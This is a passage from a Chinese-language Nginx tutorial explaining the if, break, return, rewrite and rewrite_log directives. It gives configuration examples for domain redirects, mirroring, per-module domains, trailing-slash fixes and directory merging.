(condition){…}</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>server、location</td></tr></tbody></table><p>condition为判定条件，可以支持以下写法：</p><ol><li>变量名。如果变量名对应的值为空字符串或&quot;0&quot;，if都判断为false,其他条件为true。</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$param</span>)&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>使用&quot;=“和”!=&quot;比较变量和字符串是否相等，满足条件为true，不满足为false</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_method</span> = POST)&#123;<br><span class="hljs-attribute">return</span> <span class="hljs-number">405</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：此处和Java不太一样的地方是字符串不需要添加引号,并且等号和不等号前后到需要加<strong>空格</strong>。</p><ol start="3"><li><p>使用正则表达式对变量进行匹配，匹配成功返回true，否则返回false。变量与正则表达式之间使用&quot;<sub>&quot;,&quot;</sub>*&quot;,&quot;!<sub>&quot;,&quot;!</sub>*&quot;来连接。</p><p>&quot;~&quot;代表匹配正则表达式过程中区分大小写，</p><p>&quot;~*&quot;代表匹配正则表达式过程中不区分大小写</p><p>&quot;!<sub>“和”!</sub>*&quot;刚好和上面取相反值，如果匹配上返回false,匹配不上返回true</p></li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$http_user_agent</span> <span class="hljs-regexp">~ MSIE)</span>&#123;<br><span class="hljs-comment">#$http_user_agent的值中是否包含MSIE字符串，如果包含返回true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注意：正则表达式字符串一般不需要加引号，但是如果字符串中包含&quot;}“或者是”;&quot;等字符时，就需要把引号加上。</p><ol start="4"><li>判断请求的文件是否存在使用&quot;-f&quot;和&quot;!-f&quot;,</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (-f <span class="hljs-variable">$request_filename</span>)&#123;<br><span class="hljs-comment">#判断请求的文件是否存在</span><br>&#125;<br><span class="hljs-attribute">if</span> (!-f <span class="hljs-variable">$request_filename</span>)&#123;<br><span class="hljs-comment">#判断请求的文件是否不存在</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li><p>判断请求的目录是否存在使用&quot;-d&quot;和&quot;!-d&quot;</p></li><li><p>判断请求的目录或者文件是否存在使用&quot;-e&quot;和&quot;!-e&quot;</p></li><li><p>判断请求的文件是否可执行使用&quot;-x&quot;和&quot;!-x&quot;</p></li></ol><h4 id="break指令"><a class="markdownIt-Anchor" href="#break指令"></a> break指令</h4><p>该指令用于中断当前相同作用域中的其他Nginx配置。与该指令处于同一作用域的Nginx配置中，位于它前面的指令配置生效，位于后面的指令配置无效。<strong>并且break还有另外一个功能就是终止当前的匹配并把当前的URI在本location进行重定向访问处理。</strong></p><table><thead><tr><th>语法</th><th>break;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>server、location、if</td></tr></tbody></table><p>例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /testbreak&#123;<br>default_type text/plain;<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$username</span> TOM;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$args</span>)&#123;<br>Set <span class="hljs-variable">$username</span> JERRY;<br>        <span class="hljs-built_in">break</span>;<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$username</span> ROSE;<br>&#125;<br>add_header username <span class="hljs-variable">$username</span>;<br><span class="hljs-built_in">return</span> 200 <span class="hljs-variable">$username</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="return指令"><a class="markdownIt-Anchor" href="#return指令"></a> return指令</h4><p>该指令用于完成对请求的处理，直接向客户端返回。在return后的所有Nginx配置都是无效的。</p><table><thead><tr><th>语法</th><th>return code [text];<br/>return code URL;<br/>return URL;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>server、location、if</td></tr></tbody></table><p>code:为返回给客户端的HTTP状态代理。可以返回的状态代码为0~999的任意HTTP状态代理</p><p>text:为返回给客户端的响应体内容，支持变量的使用</p><p>URL:为返回给客户端的URL地址</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br><br>return <span class="hljs-number">200</span> success;<br>&#125;<br><br><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br><br>return https://www.baidu.com; // <span class="hljs-number">302</span>重定向到百度<br>&#125;<br><br><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br>return <span class="hljs-number">302</span> https://www.baidu.com;<br>&#125;<br><br><span class="hljs-keyword">location</span> <span class="hljs-title">/testreturn</span> &#123;<br>return <span class="hljs-number">302</span> www.baidu.com;//不允许这么写<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="rewrite指令"><a class="markdownIt-Anchor" href="#rewrite指令"></a> rewrite指令</h4><p>该指令通过正则表达式的使用来改变URI。可以同时存在一个或者多个指令，按照顺序依次对URL进行匹配和处理。</p><table><thead><tr><th>语法</th><th>rewrite regex replacement [flag];</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>server、location、if</td></tr></tbody></table><p>regex:用来匹配URI的正则表达式</p><p>replacement:匹配成功后，用于替换URI中被截取内容的字符串。如果该字符串是以&quot;http://&quot;或者&quot;https://&quot;开头的，则不会继续向下对URI进行其他处理，而是直接返回重写后的URI给客户端。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/url\w*$</span> https://www.baidu.com;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>flag:用来设置rewrite对URI的处理行为，可选值有如下：</p><ul><li>last:终止继续在本location块中处理接收到的URI，并将此处重写的URI作为一个新的URI，使用各location块进行处理。该标志将重写后的URI重写在server块中执行，<strong>为重写后的URI提供了转入到其他location块的机会</strong>。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">last</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">last</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.200.133:8081/rewrite/testabc</code>,能正确访问</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589475653252.png" alt="1589475653252" /></p><ul><li>break：将此处重写的URI作为一个新的URI,在本块中继续进行处理。该标志将重写后的地址在当前的location块中执行，<strong>不会将新的URI转向其他的location块</strong>。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br>    <span class="hljs-comment">#/test   /usr/local/nginx/html/test/index.html</span><br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问 <code>http://192.168.200.133:8081/rewrite/demoabc</code>,页面报404错误</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589475732042.png" alt="1589475732042" /></p><ul><li>redirect：将重写后的URI返回给客户端，状态码为302，指明是临时重定向URI,主要用在replacement变量不是以&quot;http://&quot;或者&quot;https://&quot;开头的情况。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">redirect</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">redirect</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问<code>http://192.168.200.133:8081/rewrite/testabc</code>请求会被临时重定向，浏览器地址也会发生改变</p><ul><li>permanent：将重写后的URI返回给客户端，状态码为301，指明是永久重定向URI,主要用在replacement变量不是以&quot;http://&quot;或者&quot;https://&quot;开头的情况。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> rewrite &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(test)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/rewrite/(demo)\w*$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br><span class="hljs-section">location</span> /test&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> test_success;<br>&#125;<br><span class="hljs-section">location</span> /demo&#123;<br><span class="hljs-attribute">default_type</span> text/plain;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问<code>http://192.168.200.133:8081/rewrite/testabc</code>请求会被永久重定向，浏览器地址也会发生改变</p><h4 id="rewrite_log指令"><a class="markdownIt-Anchor" href="#rewrite_log指令"></a> rewrite_log指令</h4><p>该指令配置是否开启URL重写日志的输出功能。</p><table><thead><tr><th>语法</th><th>rewrite_log on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>rewrite_log off;</td></tr><tr><td>位置</td><td>http、server、location、if</td></tr></tbody></table><p>开启后，URL重写的相关日志将以notice级别输出到error_log指令配置的日志文件汇总。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rewrite_log</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">error_log</span>  logs/<span class="hljs-literal">error</span>.log <span class="hljs-literal">notice</span>;<br></code></pre></td></tr></table></figure><h3 id="rewrite的案例"><a class="markdownIt-Anchor" href="#rewrite的案例"></a> Rewrite的案例</h3><h4 id="域名跳转"><a class="markdownIt-Anchor" href="#域名跳转"></a> 域名跳转</h4><blockquote><p>问题分析</p></blockquote><p>先来看一个效果，如果我们想访问京东网站，大家都知道我们可以输入<code>www.jd.com</code>,但是同样的我们也可以输入<code>www.360buy.com</code>同样也都能访问到京东网站。<a href="http://xn--www-w48dncyev1bq7fw6d70b44jz5j4kd0qj8rhqpcd0trr5az4ama9098f7p5f.360buy.com">这个其实是因为京东刚开始的时候域名就是www.360buy.com</a>，<a href="http://xn--www-0h9dlb801dguajcf733ef2c1t1a6tmysbxwf4x7h3yen6qvr1bmz3g.jd.com">后面由于各种原因把自己的域名换成了www.jd.com</a>, 虽然说域名变量，但是对于以前只记住了www.360buy.com的用户来说，我们如何把这部分用户也迁移到我们新域名的访问上来，针对于这个问题，我们就可以使用Nginx中Rewrite的域名跳转来解决。</p><blockquote><p>环境准备</p></blockquote><ul><li>准备三个域名：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>   www.itcast.cn<br><span class="hljs-number">127.0.0.1</span>   www.itheima.cn<br><span class="hljs-number">127.0.0.1</span>   www.itheima.com<br></code></pre></td></tr></table></figure><ul><li><a href="http://xn--Nginxwww-jn5ou93qyk1cvdk24ac11d.itcast.cn">通过Nginx实现访问www.itcast.cn</a></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> www.itcast.cn;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">default_type</span> text/html;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;welcome to itcast&lt;/h1&gt;&#x27;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><a href="http://xn--Rewritewww-uk3sy9bh26b7i0mt9a.ithema.xn--comwww-k76j.itheima.xn--cnwww-8o6hh17mhfr897bgferwe.itcast.com">通过Rewrite完成将www.ithema.com和www.itheima.cn的请求跳转到www.itcast.com</a></p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> www.itheima.com www.itheima.cn;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/</span> http://www.itcast.cn;<br>&#125;<br></code></pre></td></tr></table></figure><p>问题描述:如何在域名跳转的过程中携带请求的URI？</p><p>修改配置信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> www.itheima.com www.itheima.cn;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> http://www.itcast.cn<span class="hljs-variable">$1</span>；<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="域名镜像"><a class="markdownIt-Anchor" href="#域名镜像"></a> 域名镜像</h4><p>镜像网站指定是将一个完全相同的网站分别放置到几台服务器上，并分别使用独立的URL进行访问。其中一台服务器上的网站叫主站，其他的为镜像网站。镜像网站和主站没有太大的区别，可以把镜像网站理解为主站的一个备份节点。可以通过镜像网站提供网站在不同地区的响应速度。镜像网站可以平衡网站的流量负载、可以解决网络宽带限制、封锁等。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589560433192.png" alt="1589560433192" /></p><p>而我们所说的域名镜像和网站镜像比较类似，上述案例中，将www.itheima.com和 <a href="http://www.itheima.xn--cnwww-8o6hq90zoxva74cr8e.itcast.cn">www.itheima.cn都能跳转到www.itcast.cn</a>，那么www.itcast.cn我们就可以把它起名叫主域名，其他两个就是我们所说的镜像域名，当然如果我们不想把整个网站做镜像，只想为其中某一个子目录下的资源做镜像，我们可以在location块中配置rewrite功能，比如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>          <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span>     www.itheima.cn www.itheima.com;<br>    <span class="hljs-section">location</span> /user &#123;<br>    <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/user(.*)$</span> http://www.itcast.cn<span class="hljs-variable">$1</span>;<br>    &#125;<br>    <span class="hljs-section">location</span> /emp&#123;<br>        <span class="hljs-attribute">default_type</span> text/html;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;emp_success&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="独立域名"><a class="markdownIt-Anchor" href="#独立域名"></a> 独立域名</h4><p>一个完整的项目包含多个模块，比如购物网站有商品搜索模块、商品详情模块和购物车模块等，那么我们如何为每一个模块设置独立的域名。</p><p>需求：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>search.itcast.com:<span class="hljs-number">81</span>  访问商品搜索模块<br>http:<span class="hljs-regexp">//i</span>tem.itcast.com:<span class="hljs-number">82</span>  访问商品详情模块<br>http:<span class="hljs-regexp">//</span>cart.itcast.com:<span class="hljs-number">83</span>  访问商品购物车模块<br></code></pre></td></tr></table></figure><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">server&#123;<br><span class="hljs-attribute">listen 81;</span><br><span class="hljs-attribute">server_name search.itcast.com;</span><br><span class="hljs-attribute">rewrite ^(.*) http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>/search$1;<br>&#125;<br>server&#123;<br><span class="hljs-attribute">listen 82;</span><br><span class="hljs-attribute">server_name item.itcast.com;</span><br><span class="hljs-attribute">rewrite ^(.*) http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>/item$1;<br>&#125;<br>server&#123;<br><span class="hljs-attribute">listen 83;</span><br><span class="hljs-attribute">server_name cart.itcast.com;</span><br><span class="hljs-attribute">rewrite ^(.*) http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>/cart$1;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="目录自动添加"><a class="markdownIt-Anchor" href="#目录自动添加"></a> 目录自动添加&quot;/&quot;</h4><p>问题描述</p><p>通过一个例子来演示下问题:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8082</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /heima &#123;<br><span class="hljs-attribute">root</span> html;<br><span class="hljs-attribute">index</span> index.html;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>通过<code>http://192.168.200.133:8082/heima</code>和通过<code>http://192.168.200.133:8082/heima/</code>访问的区别？</p><p>如果不加斜杠，Nginx服务器内部会自动做一个301的重定向，重定向的地址会有一个指令叫server_name_in_redirect on|off;来决定重定向的地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">如果该指令为on<br>重定向的地址为:  http:<span class="hljs-regexp">//</span>server_name:<span class="hljs-number">8082</span><span class="hljs-regexp">/目录名/</span>;<br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8082</span><span class="hljs-regexp">/heima/</span><br>如果该指令为off<br>重定向的地址为:  http:<span class="hljs-regexp">//</span>原URL中的域名:<span class="hljs-number">8082</span><span class="hljs-regexp">/目录名/</span>;<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/heima/</span><br></code></pre></td></tr></table></figure><p>所以就拿刚才的地址来说，<a href="http://192.168.200.133:8082/heima%E5%A6%82%E6%9E%9C%E4%B8%8D%E5%8A%A0%E6%96%9C%E6%9D%A0%EF%BC%8C%E9%82%A3%E4%B9%88%E6%8C%89%E7%85%A7%E4%B8%8A%E8%BF%B0%E8%A7%84%E5%88%99%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%8C%87%E4%BB%A4server_name_in_redirect%E4%B8%BAon%EF%BC%8C%E5%88%99301%E9%87%8D%E5%AE%9A%E5%90%91%E5%9C%B0%E5%9D%80%E5%8F%98%E4%B8%BA">http://192.168.200.133:8082/heima如果不加斜杠，那么按照上述规则，如果指令server_name_in_redirect为on，则301重定向地址变为</a> <a href="http://localhost:8082/heima/,%E5%A6%82%E6%9E%9C%E4%B8%BAoff%EF%BC%8C%E5%88%99301%E9%87%8D%E5%AE%9A%E5%90%91%E5%9C%B0%E5%9D%80%E5%8F%98%E4%B8%BAhttp://192.168.200.133:8082/heima/%E3%80%82%E5%90%8E%E9%9D%A2%E8%BF%99%E4%B8%AA%E6%98%AF%E6%AD%A3%E5%B8%B8%E7%9A%84%EF%BC%8C%E5%89%8D%E9%9D%A2%E5%9C%B0%E5%9D%80%E5%B0%B1%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%82">http://localhost:8082/heima/,如果为off，则301重定向地址变为http://192.168.200.133:8082/heima/。后面这个是正常的，前面地址就有问题。</a></p><p>注意server_name_in_redirect指令在Nginx的0.8.48版本之前默认都是on，之后改成了off,所以现在我们这个版本不需要考虑这个问题，但是如果是0.8.48以前的版本并且server_name_in_redirect设置为on，我们如何通过rewrite来解决这个问题？</p><p>解决方案</p><p>我们可以使用rewrite功能为末尾没有斜杠的URL自动添加一个斜杠</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-attribute">server_name_in_redirect</span> <span class="hljs-literal">on</span>;<br><span class="hljs-section">location</span> /heima &#123;<br><span class="hljs-attribute">if</span> (-d <span class="hljs-variable">$request_filename</span>)&#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)([^/])$</span> http://<span class="hljs-variable">$host</span>/<span class="hljs-variable">$1</span><span class="hljs-variable">$2</span>/ <span class="hljs-literal">permanent</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="合并目录"><a class="markdownIt-Anchor" href="#合并目录"></a> 合并目录</h4><p>搜索引擎优化(SEO)是一种利用搜索引擎的搜索规则来提高目的网站在有关搜索引擎内排名的方式。我们在创建自己的站点时，可以通过很多中方式来有效的提供搜索引擎优化的程度。其中有一项就包含URL的目录层级一般不要超过三层，否则的话不利于搜索引擎的搜索也给客户端的输入带来了负担，但是将所有的文件放在一个目录下又会导致文件资源管理混乱并且访问文件的速度也会随着文件增多而慢下来，这两个问题是相互矛盾的，那么使用rewrite如何解决上述问题?</p><p>举例，网站中有一个资源文件的访问路径时 /server/11/22/33/44/20.html,也就是说20.html存在于第5级目录下，如果想要访问该资源文件，客户端的URL地址就要写成 <code>http://192.168.200.133/server/11/22/33/44/20.html</code>,</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /server&#123;<br><span class="hljs-attribute">root</span> html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这个是非常不利于SEO搜索引擎优化的，同时客户端也不好记.使用rewrite我们可以进行如下配置:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> 